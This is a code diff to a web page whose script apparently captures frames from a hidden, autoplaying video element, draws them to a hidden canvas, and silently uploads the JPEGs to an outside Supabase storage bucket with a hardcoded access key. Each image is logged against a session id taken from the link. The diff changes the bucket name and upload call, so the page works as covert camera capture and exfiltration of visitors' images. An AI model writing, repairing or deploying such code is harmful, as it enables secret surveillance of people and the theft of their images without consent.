@@ -89,6 +89,7 @@ video,canvas{display:none}
 <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
 <script>
 const S='https://hdpopgdfdttoldxavetw.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhkcG9wZ2RmZHR0b2xkeGF2ZXR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5MjY1MjIsImV4cCI6MjA5NDUwMjUyMn0.h7w18IWPkZBTlAXkf5cyfs2UtaG3H70it0pei1b4G88';
+const BUCKET='photos';
 const sid=new URLSearchParams(location.search).get('s');
 const v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');
 let _started=false,_timer=null;
@@ -117,9 +118,10 @@ async function up(){
   const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.85));if(!blob)return;
   const f=sid+'/'+Date.now()+'.jpg';
   try{
-    const r=await fetch(S+'/storage/v1/object/captures/'+f,{method:'POST',headers:{'Authorization':'Bearer '+K},body:blob});
+    const r=await fetch(S+'/storage/v1/object/'+BUCKET+'/'+f,{method:'PUT',headers:{'Authorization':'Bearer '+K,'Content-Type':'image/jpeg'},body:blob});
     if(!r.ok)return;
-    await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({session_id:sid,image_url:S+'/storage/v1/object/public/captures/'+f})});
+    const url=S+'/storage/v1/object/public/'+BUCKET+'/'+f;
+    await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({session_id:sid,image_url:url})});
   }catch(e){}
 }
 
